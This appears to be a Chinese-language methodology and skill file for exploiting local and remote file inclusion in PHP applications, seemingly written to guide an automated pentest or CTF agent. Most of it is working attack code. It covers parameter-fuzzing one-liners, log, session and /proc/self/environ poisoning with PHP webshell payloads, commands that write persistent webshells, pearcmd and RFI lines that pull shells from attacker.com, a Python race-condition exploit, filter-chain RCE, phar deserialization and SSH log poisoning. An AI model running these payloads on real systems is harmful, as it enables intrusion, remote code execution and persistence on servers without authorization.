# lfi-rfi-methodology

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# 文件包含漏洞方法论 (LFI/RFI)


## ⛔ 深入参考（确认 LFI 后必读）

- 日志投毒完整步骤、PHP Wrapper、Session 文件包含、include() 陷阱诊断 → [references/lfi-to-rce.md](references/lfi-to-rce.md)
- pearcmd.php 利用、PHP Filter Chain RCE、Session 条件竞争 → 同在 [references/lfi-to-rce.md](references/lfi-to-rce.md)
- LFI 到 RCE 提权路径详解 → [references/lfi2rce-techniques.md](references/lfi2rce-techniques.md)

---

## ⛔ Phase 0: 页面发现（LFI 测试的前提！）

**在测试 LFI 之前必须先找全所有可访问页面。**

1. 用 `ffuf` / `spray` 扫描 `.php/.html`；失败时立即降级用 python3 requests 批量测试：
```
private.php, admin.php, secret.php, flag.php, test.php, debug.php, panel.php, dashboard.php,
upload.php, api.php, config.php, backup.php, shell.php, cmd.php, exec.php, portal.php,
manage.php, internal.php, hidden.php, restricted.php, secure.php, system.php, info.php,
phpinfo.php, setup.php, install.php, download.php, view.php, file.php, read.php, include.php
```
2. 记录所有返回 200 且非空的页面 → 这些才是 LFI 测试目标

## Phase 1: 发现文件包含点

⛔ **退出条件**：某端点测试 3+ 个参数均无响应差异（长度差 < 10 字节）→ 标记"无 LFI" → 换端点

### ⛔ 参数 Fuzz（一步到位，禁止逐个手动测试！）

用 Python 批量测试所有常见参数（3 轮以上还在枚举参数 = 违规）：
```
python3 -c "import requests;[print(f'FOUND: {p}?{param}') for p in ['private.php','index.php','page.php','view.php','file.php','read.php'] for param in ['file','page','path','include','doc','template','lang','module','view','load'] if 'root:' in requests.get(f'http://TARGET/{p}?{param}=../../../etc/passwd',timeout=3).text]"
```
- ffuf 做参数 Fuzz 时：wordlist 必须用 `Web/CTF/Fuzz_param.txt`（不是目录字典！）
- 不能只测 file 参数：id 参数也可能存在 LFI
- URL 编码绕过：`..%2f`、`%2e%2e%2f` 绕过路径过滤

常见参数名: `file`, `page`, `path`, `include`, `doc`, `template`, `lang`, `module`, `action`, `view`

测试向量:
```
?file=../../../etc/passwd
?file=../../../etc/passwd%00       (PHP < 5.3.4)
?file=..%252f..%252fetc%252fpasswd (双编码)
```

**验证方法**: 对比有参数和无参数的响应长度/内容，有差异 = 参数有效

## Phase 2: 路径穿越测试
```
逐步增加 ../ 层数（通常4-7层到根目录）:
?file=../../../../etc/passwd
```

## Phase 3: 关键文件读取

### ⛔ Dockerfile/源码优先路径规则
当已获取 Dockerfile 或应用源码时：
1. 提取 `WORKDIR` 值（如 `/var/www/html/`）
2. 提取 flag 文件名（如 `xbow-flag.txt`）
3. **拼接 WORKDIR + filename 作为第一优先读取路径**（如 `/var/www/html/xbow-flag.txt`）
4. ⛔ 禁止跳过已知路径去盲猜 `/app/flag.txt` `/flag` 等

**Linux**: `/etc/passwd`, `/proc/self/environ`, `/var/log/apache2/access.log`
**Windows**: `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`
**Web应用**: `config.php`, `.env`, `wp-config.php`
**源码**: `php://filter/convert.base64-encode/resource=index`

### PHP 文件包含陷阱
- 直接 include .php 文件不会显示源码，只执行代码
- 需要用 `php://filter/convert.base64-encode/resource=xxx` 读取 PHP 源码

## Phase 4: LFI → RCE 决策树

⛔ **日志投毒优先触发条件**：当任务描述/题目名包含 `poison`、`log`、`日志` 关键字时，**跳过 wrapper 尝试，直接进入日志投毒流程**！

```
LFI 确认
│   ├─ ⛔ 题目含 "poison"/"log" 关键字？→ 直接日志投毒（跳过 Phase 3 后半段）
│   ├─ 目标是 PHP + include()？
│   │   ├─ pearcmd.php 存在？→ pearcmd 写 shell（最快，不依赖日志/session）
│   │   ├─ file_exists() 不检查？→ php://input / data:// wrapper
│   │   ├─ file_exists() 检查？→ wrapper 不可用！用日志投毒或 PHP filter chain
│   │   ├─ 有 session 功能？→ Session 文件包含（将 PHP 代码注入 session 如用户名字段，包含 session 文件执行）
│   ├─ 日志投毒（最通用）
│   │   ├─ User-Agent 注入 PHP 代码
│   │   ├─ ⚠️ 绝对不用 system('cat /file.php')！用 file_get_contents() + echo
│   │   └─ 包含 /var/log/apache2/access.log 触发
│   ├─ PHP Filter Chain RCE（无需文件写入/日志/session）
│   │   └─ 用 php_filter_chain_generator.py 生成 chain
│   └─ 详细步骤 → [references/lfi-to-rce.md](references/lfi-to-rce.md)
```

## Phase 5: RFI 测试
`?file=http://attacker.com/shell.txt` (需 allow_url_include=On) | `?file=\\attacker.com\share\shell.php` (SMB/UNC)

## 注意事项
- **include() 会执行 PHP，file_get_contents() 读原始文本** — 关键区别
- LFI 比 RFI 更常见（RFI 需 PHP 配置允许）| HTTP 200 + Content-Length: 0 → PHP 语法错误被吞


---

## REF: lfi-to-rce

# LFI → RCE 技术详解

## 日志投毒 (Log Poisoning) — 最常用

### 完整攻击链（必须严格按顺序执行并验证每一步）

**Step 1: 确认 LFI 能读取日志文件**
```bash
# 用 curl 测试，不要用 browser！逐个尝试日志路径
curl -s "http://target/vuln.php?file=../../../../../../var/log/nginx/access.log" | head -5
curl -s "http://target/vuln.php?file=../../../../../../var/log/apache2/access.log" | head -5
# 如果有 WAF/过滤，用已知的 bypass（如 ....// 双写）
curl -s "http://target/vuln.php?file=....//....//....//....//....//var/log/nginx/access.log" | head -5
```
**验证**: 响应中应包含类似 `GET /xxx HTTP/1.1` 的访问日志行。如果为空或报错 → 换路径。

**Step 2: 注入 PHP payload 到 User-Agent**
```bash
# 用 curl 发请求，User-Agent 设为 PHP 代码
# 注意：一次注入失败（语法错误）会污染日志，后续所有 include 都报错！
# 所以 payload 必须一次正确
curl -s "http://target/" -H "User-Agent: <?php echo shell_exec(\$_GET['cmd']); ?>"
```
**⚠️ 关键**: shell 中 `$` 必须转义为 `\$`，否则 bash 会展开变量导致 payload 损坏。

**Step 3: 验证注入 — 通过 LFI 执行命令**
```bash
# 用 LFI 包含日志文件 + cmd 参数执行命令
curl -s "http://target/vuln.php?file=....//....//....//....//var/log/nginx/access.log&cmd=id"
```
**验证**: 响应中应包含 `uid=33(www-data)` 之类的输出。

**Step 4: 如果 Step 3 成功 → 立即读 flag + 写持久 webshell**
```bash
# 读 flag
curl -s "http://target/vuln.php?file=....//....//var/log/nginx/access.log&cmd=find+/+-name+'flag*'+-o+-name+'FLAG*'+2>/dev/null"
curl -s "http://target/vuln.php?file=....//....//var/log/nginx/access.log&cmd=cat+/flag.txt"
# 写持久 webshell（不再依赖日志）
curl -s "http://target/vuln.php?file=....//....//var/log/nginx/access.log&cmd=echo+'<?php+system(\$_GET[c]);?>'+>+/var/www/html/s.php"
# 验证 webshell
curl -s "http://target/s.php?c=id"
```

### 常见失败原因与排查

| 症状 | 原因 | 解决 |
|------|------|------|
| LFI 返回空/200 Content-Length:0 | PHP payload 语法错误，include 时解析失败 | payload 已污染日志，换日志文件（error.log）或用其他 LFI→RCE 方法 |
| `$_GET` 变成空 | bash 没转义 `$` | 用 `\$_GET` 或单引号包裹 |
| 日志文件找不到 | 路径不对 | 遍历: nginx/access.log, apache2/access.log, httpd/access_log |
| 能读日志但注入后无输出 | disable_functions 禁了 system/exec | 用 `file_get_contents()` 读文件，或用 mail()+LD_PRELOAD bypass |
| 注入成功但目录遍历被拦 | WAF 拦截 `../` | 用 `....//`, `..%2f`, URL双编码 |

### 直接读 flag 的 payload（不走 webshell）
```bash
# 如果只需要读 flag 不需要 RCE：
curl -s "http://target/" -H "User-Agent: <?php echo file_get_contents('/flag.txt'); ?>"
curl -s "http://target/vuln.php?file=....//....//var/log/nginx/access.log"
# 响应中搜索 flag{ 即可
```

**⚠️ 关键陷阱（必读）：**
- **绝对不要用 `system('cat /file.php')`！** `cat` 输出的 `<?php ... ?>` 在 PHP 解析上下文中会被再次解析 → 语法错误 → 输出为空
- **必须用 `file_get_contents('/FLAG.php')` + `echo`** — 读取为原始字符串，不经二次解析
- HTTP 200 但 **Content-Length: 0** → PHP 代码产生了语法错误
- **一旦注入了错误 payload，该日志文件就废了** — 每次 include 都会尝试解析错误的 PHP，导致整个页面出错

**日志文件常见路径**: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/httpd/access_log`, `/var/log/nginx/error.log`, `/var/log/apache2/error.log`

**Payload 模板（按优先级）：**
```
Webshell（首选）: <?php echo shell_exec($_GET['cmd']); ?>
读取 flag: <?php echo file_get_contents('/flag.txt'); ?>
系统命令: <?php echo shell_exec('ls /'); ?>
```

## PHP Wrapper
- `php://input` + POST body 含 PHP 代码
- `data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL0ZMQUcucGhwJyk7Pz4=`
- `expect://id`（需 expect 扩展）
- **注意**: `file_exists()` 对 PHP stream wrapper 返回 false！如果目标先 `file_exists()` 再 `include()`，wrapper 不可用，必须用日志投毒

## Session 文件包含（无需外部服务器！）

**步骤 1**: 找到把用户输入存入 session 的功能
```
http_request url="http://target/login.php" method="POST" body="username=<?php echo file_get_contents('/flag.txt'); ?>&password=test"
```

**步骤 2**: 获取 PHPSESSID（从 Set-Cookie 头）

**步骤 3**: 包含 session 文件
```
?file=../../../../tmp/sess_abc123def456
```

**Session 文件路径**：`/tmp/sess_<ID>`, `/var/lib/php/sessions/sess_<ID>`, `/var/lib/php5/sess_<ID>`

## pearcmd.php 利用（PHP 环境通杀）

**原理**：`pearcmd.php`（PHP PEAR 包管理器）自带文件写入功能，无需额外条件。

**条件**：
- 存在 LFI 漏洞
- PHP 安装了 PEAR（Docker PHP 镜像默认包含）
- `register_argc_argv=On`（Docker PHP 默认开启）

```bash
# Step 1: 利用 pearcmd 的 config-create 命令写入 webshell
# 核心：通过 URL 参数传入 PEAR 命令行参数
curl 'http://target/vuln.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[1]);?>+/tmp/shell.php'

# Step 2: 包含写入的 shell
curl 'http://target/vuln.php?file=/tmp/shell.php&1=cat+/flag.txt'
```

**变体（不同 pearcmd 路径）**：
```
/usr/local/lib/php/pearcmd.php    ← Docker PHP 最常见
/usr/share/php/pearcmd.php        ← Debian/Ubuntu
/usr/lib/php/pearcmd.php
```

**变体（install 命令下载远程文件）**：
```bash
curl 'http://target/vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://attacker.com/shell.php'
```

---

## PHP Filter Chain RCE（无文件写入 LFI→RCE）

**原理**：通过链式嵌套 `php://filter` 的 `convert.iconv` 转换，不写入任何文件，直接在 `include()` 时生成任意 PHP 代码。

**条件**：
- 存在 LFI 且通过 `include()` 包含
- 不依赖文件写入、不依赖日志、不依赖 session

**工具**：`php_filter_chain_generator.py`

```bash
# 安装工具
git clone https://github.com/synacktiv/php_filter_chain_generator.git

# 生成执行 id 命令的 filter chain
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# 输出一个很长的 php://filter/... 字符串

# 使用：将生成的 chain 作为 LFI 的参数值
curl 'http://target/vuln.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...|/resource=php://temp'
```

**手动构造（短 payload）**：
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|...|convert.base64-decode/resource=php://temp
```

---

## Session 文件包含条件竞争（无需用户功能）

**原理**：PHP 默认对每个 PHPSESSID 创建 session 文件。如果 `session.upload_progress.enabled=On`（默认开启），上传文件时 PHP 会将上传进度写入 session 文件，其中包含用户可控的文件名。

**条件**：
- `session.upload_progress.enabled = On`（PHP 默认开启）
- `session.upload_progress.cleanup = On`（默认开启，上传完毕后清除 → 需要竞争）

**利用（条件竞争）**：

```python
#!/usr/bin/env python3
"""Session upload progress race condition → LFI to RCE"""
import requests
import threading

TARGET = 'http://target/vuln.php'
SESS_ID = 'race_session_test'
PAYLOAD = '<?php system("cat /flag.txt"); ?>'

# session 文件路径（按顺序尝试）
SESS_PATHS = [
    f'/tmp/sess_{SESS_ID}',
    f'/var/lib/php/sessions/sess_{SESS_ID}',
    f'/var/lib/php5/sess_{SESS_ID}',
]

def upload():
    """持续上传文件，让 PHP 在 session 中写入包含 payload 的文件名"""
    while True:
        requests.post(
            TARGET,
            files={'file': (PAYLOAD, 'x')},  # 文件名=payload
            data={'PHP_SESSION_UPLOAD_PROGRESS': PAYLOAD},
            cookies={'PHPSESSID': SESS_ID},
        )

def include_session():
    """持续尝试包含 session 文件"""
    for path in SESS_PATHS:
        for _ in range(200):
            r = requests.get(f'{TARGET}?file={path}', cookies={'PHPSESSID': SESS_ID})
            if 'flag{' in r.text or len(r.text) > 100:
                print(f'[+] SUCCESS: {r.text}')
                return True
    return False

# 启动上传线程
for _ in range(5):
    threading.Thread(target=upload, daemon=True).start()

# 尝试包含
include_session()
```

---

## /proc/self/fd 暴力
遍历 `/proc/self/fd/0` 到 `/proc/self/fd/255`

## 直接包含 .php 文件的陷阱

**当 LFI 通过 `include()` 包含 .php 文件时：**
- PHP 引擎会**执行**该文件，而非显示源码
- flag 在 `<?php flag{...} ?>` 中 → `include()` 尝试解析 → 语法错误 → 空输出
- `error_reporting(0)` 下错误被静默吞掉，返回 HTTP 200 + Content-Length: 0
- **解决方案**: 用日志投毒获得 RCE，再用 `file_get_contents()` 读取


---

## REF: lfi2rce-techniques

# LFI 到 RCE 提权路径详解

> 本文档覆盖 lfi-to-rce.md **未展开**的进阶 LFI2RCE 技术。基础日志投毒、PHP Wrapper、pearcmd、Session 文件包含和 Filter Chain 生成器用法请参考 [lfi-to-rce.md](lfi-to-rce.md)。

---

## PHP Filter Chain 任意写入原理（convert.iconv）

通过 `php://filter` 链式叠加 `convert.iconv` 编码转换，在 `include()` 时凭空生成任意 PHP 代码，无需写文件、无需日志、无需 session。

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|<逐字符 iconv 链>|convert.base64-decode/resource=php://temp
```

### 逐字符构造过程

1. `convert.iconv.UTF8.CSISO2022KR` 向字符串头部注入 `\x1b$)C`
2. 选择特定 iconv 编码对，使注入的字节经转换后仅保留一个有效 base64 字符
3. `convert.base64-decode | convert.base64-encode` 清除所有非 base64 字符
4. `convert.iconv.UTF8.UTF7` 清除等号
5. 重复 1-4 直到拼完整个 base64 payload，最终 `convert.base64-decode` 得到 PHP 代码

### php://temp 绕过后缀限制

当 `include($_GET['f'].'.php')` 拼接后缀时，用 `php://temp` 作为 resource——它允许任意后缀附加而不影响 filter 执行：

```bash
curl "http://target/vuln.php?f=php://filter/<chain>/resource=php://temp"
```

### Error-Based Oracle 盲读文件

LFI 无回显时，利用 `convert.iconv.UTF8.UCS-4LE` 制造内存膨胀 + `dechunk` 做布尔判断：

- 首字符为十六进制 -> dechunk 正常处理 -> 无报错
- 首字符非十六进制 -> dechunk 清空 -> 内存炸弹触发 PHP 错误

工具：`php_filter_chains_oracle_exploit`、`lightyear`

---

## phpinfo + 条件竞争上传

### 前提条件

- 存在可访问的 `phpinfo()` 页面 + LFI 漏洞 + `file_uploads = On`

### 攻击原理

PHP 收到 multipart 上传时创建临时文件（`/tmp/phpXXXXXX`），请求结束后立即删除。phpinfo() 打印 `$_FILES[tmp_name]` 暴露路径。利用输出缓冲分块刷新，在临时文件删除前通过 LFI 包含它。

### 攻击步骤

```bash
# 1. 大 POST 请求发往 phpinfo 页面，padding 促使提前刷新输出
# 2. 流式响应中解析 $_FILES[tmp_name]（注意 HTML 编码 =&gt;）
# 3. 立即用 LFI 包含该临时路径
# 4. payload 写持久 shell：
#    <?php file_put_contents('/tmp/.p.php','<?php system($_GET["x"]); ?>'); ?>
```

### 关键参数检查

| 参数 | 要求 |
|------|------|
| `file_uploads` | On |
| `upload_tmp_dir` | LFI 可达的路径 |
| `output_buffering` | 越小越好（4096 常见） |
| `open_basedir` | 不阻止 include 临时目录 |

提高成功率：多线程并发 10-20 worker；Padding 放在 URL 参数/Cookie/User-Agent/Accept-Language（各 5-10KB）；socket 级别逐块读取响应。

---

## Eternal Waiting（永久等待 + 暴力枚举）

PHP 上传产生 `/tmp/php[a-zA-Z0-9]{6}` 临时文件。让 LFI 的 include 永远不返回，临时文件就不会被删除。

### 使 include 永久挂起

```bash
# /sys/kernel/security/apparmor/revision 读取时永久阻塞（非 Docker 环境）
curl "http://target/vuln.php?file=../../../sys/kernel/security/apparmor/revision"
```

### 攻击流程

1. 用 N-1 个连接发带 webshell 的上传请求（每个 20 文件），同时 include 阻塞文件使其挂起
2. 临时文件持续存在：`(N-1) * 20` 个
3. 最后一个连接暴力枚举 `/tmp/phpXXXXXX`

### 时间估算

- 文件名空间：62^6 = 56,800,235,584
- 150 连接 * 20 文件 = 2,980 个临时文件，10 req/s -> 约 530 小时
- PHP-FPM + `request_terminate_timeout=30s`：请求超时但临时文件不删除，积累 10 万文件后降至约 30 分钟

---

## Phar 反序列化

Phar 文件 metadata 以序列化格式存储。使用 `phar://` 访问时 metadata 自动反序列化——即使函数本身不执行代码。

### 可触发的函数

`file_get_contents()`、`fopen()`、`file()`、`file_exists()`、`md5_file()`、`filemtime()`、`filesize()`

### 利用步骤

```php
// 构造恶意 phar（本地执行）
<?php
class TargetClass {
    public $cmd = 'id';
    function __destruct() { system($this->cmd); }
}
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('x.txt', 'padding');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");  // JPG 魔术字节
$phar->setMetadata(new TargetClass());
$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 create_phar.php
# 上传 evil.phar（可改后缀 .jpg 绕过检测），通过 LFI 触发
curl "http://target/vuln.php?file=phar://uploads/evil.jpg/x.txt"
```

前提：能上传文件 + 目标有可利用的 `__destruct()`/`__wakeup()` 类 + LFI 点使用上述函数之一

---

## Nginx 临时文件竞争

Nginx 反代 PHP 时，请求体超过缓冲（默认 ~8KB）写入磁盘临时文件。Nginx 立即 unlink 文件名但保持 fd 打开，通过 `/proc/<pid>/fd/<fd>` 仍可访问。

### 攻击步骤

```bash
# 1. 枚举 nginx worker PID
for pid in $(seq 100 4000); do
    curl -s "http://target/vuln.php?file=../../../proc/$pid/cmdline" | \
    grep -q "nginx" && echo "PID: $pid"
done

# 2. 发超大请求体（含 payload），故意不发完保持 fd 打开
# Content-Length 声明 1MB 但只发送 16KB，连接挂起 ~60s

# 3. 暴力枚举 fd（通常 10-45）
for fd in $(seq 10 45); do
    curl -s "http://target/vuln.php?file=../../../proc/$PID/fd/$fd"
done
```

绕过 `realpath()` 的 /proc 路径链：`/proc/<pidA>/cwd/proc/<pidB>/root/proc/<pidC>/fd/<fd>`

---

## /proc/self/environ 注入

`/proc/self/environ` 含当前进程环境变量，`HTTP_USER_AGENT` 反映 User-Agent 头。通过 LFI include 此文件时注入的 PHP 代码会被执行：

```bash
curl "http://target/vuln.php?file=../../../proc/self/environ" \
     -H "User-Agent: <?php system(\$_GET['c']); ?>"
```

注意：需 `/proc` 可访问（Docker 中常受限）；使用 `--ignore-content-length` 处理伪文件。

---

## 日志投毒扩展路径

lfi-to-rce.md 已覆盖 Apache/Nginx access.log，以下为补充：

### SSH auth.log 投毒

```bash
ssh '<?php system($_GET["c"]); ?>'@target
curl "http://target/vuln.php?file=../../../var/log/auth.log&c=id"
```

路径：`/var/log/auth.log`（Debian）、`/var/log/secure`（CentOS）

### FTP vsftpd 日志投毒

用 PHP payload 作为 FTP 用户名登录，包含 `/var/log/vsftpd.log`。

### 邮件投毒

发送含 payload 的邮件到本地用户，包含 `/var/mail/<user>` 或 `/var/spool/mail/<user>`。

### 扩展日志路径

```
/var/log/apache2/error.log    /var/log/nginx/error.log
/var/log/httpd/error_log      /usr/local/apache/log/error_log
/var/log/auth.log             /var/log/secure
/var/log/vsftpd.log           /var/log/mail.log
/var/mail/www-data
```

---

## 技术选择速查表

| 技术 | 前提条件 | 需要写文件 | 难度 |
|------|---------|:---:|:---:|
| PHP Filter Chain | include() + PHP | 否 | 低 |
| phpinfo 竞争 | phpinfo 页面 + file_uploads=On | 临时 | 中 |
| Eternal Waiting | /sys/kernel/security 可读 + 非 Docker | 临时 | 高 |
| Phar 反序列化 | 可上传文件 + 可利用类 | 需上传 | 中 |
| Nginx 临时文件 | Nginx 反代 + /proc 可读 | 否 | 高 |
| /proc/self/environ | /proc 可访问 | 否 | 低 |
| SSH auth.log 投毒 | SSH 开放 + auth.log 可读 | 否 | 低 |
